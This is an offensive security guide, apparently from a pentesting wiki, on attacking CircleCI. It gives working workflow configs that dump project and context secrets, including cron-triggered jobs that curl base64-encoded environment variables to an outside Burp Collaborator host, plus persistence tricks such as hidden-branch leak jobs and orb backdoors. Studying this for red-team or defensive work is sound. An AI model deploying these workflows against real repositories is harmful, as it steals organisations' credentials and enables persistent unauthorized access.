# CircleCI

## Basic Information

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) is a Continuos Integration platform where you ca **define templates** indicating what you want it to do with some code and when to do it. This way you can **automate testing** or **deployments** directly **from your repo master branch** for example.

## Permissions

**CircleCI** **inherits the permissions** from github and bitbucket related to the **account** that logs in.\
In my testing I checked that as long as you have **write permissions over the repo in github**, you are going to be able to **manage its project settings in CircleCI** (set new ssh keys, get project api keys, create new branches with new CircleCI configs...).

However, you need to be a a **repo admin** in order to **convert the repo into a CircleCI project**.

## Env Variables & Secrets

According to [**the docs**](https://circleci.com/docs/2.0/env-vars/#) there are different ways to **load values in environment variables** inside a workflow.

### Built-in env variables

Every container run by CircleCI will always have [**specific env vars defined in the documentation**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) like `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` or `CIRCLE_USERNAME`.

### Clear text

You can declare them in clear text inside a **command**:

```yaml
- run:
    name: "set and echo"
    command: |
        SECRET="A secret"
        echo $SECRET
```

You can declare them in clear text inside the **run environment**:

```yaml
- run:
    name: "set and echo"
    command: echo $SECRET
    environment:
        SECRET: A secret
```

You can declare them in clear text inside the **build-job environment**:

```yaml
jobs:
    build-job:
        docker:
            - image: cimg/base:2020.01
    environment:
        SECRET: A secret
```

You can declare them in clear text inside the **environment of a container**:

```yaml
jobs:
    build-job:
        docker:
            - image: cimg/base:2020.01
                environment:
                    SECRET: A secret
```

### Project Secrets

These are **secrets** that are only going to be **accessible** by the **project** (by **any branch**).\
You can see them **declared in** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (662).png>)

{% hint style="danger" %}
The "**Import Variables**" functionality allows to **import variables from other projects** to this one.
{% endhint %}

### Context Secrets

These are secrets that are **org wide**. By **default any repo** is going to be able to **access any secret** stored here:

![](<../.gitbook/assets/image (661).png>)

{% hint style="success" %}
However, note that a different group (instead of All members) can be **selected to only give access to the secrets to specific people**.\
This is currently one of the best ways to **increase the security of the secrets**, to not allow everybody to access them but just some people.
{% endhint %}

## Attacks

### Search Clear Text Secrets

If you have **access to the VCS** (like github) check the file `.circleci/config.yml` of **each repo on each branch** and **search** for potential **clear text secrets** stored in there.

### Secret Env Vars & Context enumeration

Checking the code you can find **all the secrets names** that are being **used** in each `.circleci/config.yml` file. You can also get the **context names** from those files or check them in the web console: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Exfiltrate Project secrets

{% hint style="warning" %}
In order to **exfiltrate ALL** the project and context **SECRETS** you **just** need to have **WRITE** access to **just 1 repo** in the whole github org (_and your account must have access to the contexts but by default everyone can access every context_).
{% endhint %}

{% hint style="danger" %}
The "**Import Variables**" functionality allows to **import variables from other projects** to this one. Therefore, an attacker could **import all the project variables from all the repos** and then **exfiltrate all of them together**.
{% endhint %}

All the project secrets always are set in the env of the jobs, so just calling env and obfuscating it in base64 will exfiltrate the secrets in the **workflows web log console**:

```yaml
version: 2.1

jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil env"
          command: "env | base64"

workflows:
  exfil-env-workflow:
    jobs:
      - exfil-env
```

If you **don't have access to the web console** but you have **access to the repo** and you know that CircleCI is used, you can just **create a workflow** that is **triggered every minute** and that **exfils the secrets to an external address**:

```yaml
version: 2.1

jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil env"
          command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
  exfil-env-workflow:
    triggers:
      - schedule:
          cron: "* * * * *"
          filters:
            branches:
              only:
                - circleci-project-setup
    jobs:
      - exfil-env
```

### Exfiltrate Context Secrets

You need to **specify the context name** (this will also exfiltrate the project secrets):

```yaml
```

```yaml
version: 2.1

jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil env"
          command: "env | base64"

workflows:
  exfil-env-workflow:
    jobs:
      - exfil-env:
          context: Test-Context
```

If you **don't have access to the web console** but you have **access to the repo** and you know that CircleCI is used, you can just **modify a workflow** that is **triggered every minute** and that **exfils the secrets to an external address**:

```yaml
version: 2.1

jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil env"
          command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
  exfil-env-workflow:
    triggers:
      - schedule:
          cron: "* * * * *"
          filters:
            branches:
              only:
                - circleci-project-setup
    jobs:
      - exfil-env:
          context: Test-Context
```

{% hint style="warning" %}
Just creating a new `.circleci/config.yml` in a repo **isn't enough to trigger a circleci build**. You need to **enable it as a project in the circleci console**.
{% endhint %}

### Escape to Cloud

**CircleCI** gives you the option to run **your builds in their machines or in your own**.\
By default their machines are located in GCP, and you initially won't be able to fid anything relevant. However, if a victim is running the tasks in **their own machines (potentially, in a cloud env)**, you might find a **cloud metadata endpoint with interesting information on it**.

Notice that in the previous examples it was launched everything inside a docker container, but you can also **ask to launch a VM machine** (which may have different cloud permissions):

```yaml
jobs:
  exfil-env:
    #docker:
    #  - image: cimg/base:stable
    machine:
      image: ubuntu-2004:current
```

Or even a docker container with access to a remote docker service:

```yaml
jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - setup_remote_docker:
          version: 19.03.13
```

### Persistence

* It's possible to **create** **user tokens in CircleCI** to access the API endpoints with the users access.
  * _https://app.circleci.com/settings/user/tokens_
* It's possible to **create projects tokens** to access the project with the permissions given to the token.
  * _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* It's possible to **add SSH keys** to the projects.
  * _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* It's possible to **create a cron job in hidden branch** in an unexpected project that is **leaking** all the **context env** vars everyday.
  * Or even create in a branch / modify a known job that will **leak** all context and **projects secrets** everyday.
* If you are a github owner you can **allow unverified orbs** and configure one in a job as **backdoor**
* You can find a **command injection vulnerability** in some task and **inject commands** via a **secret** modifying its value
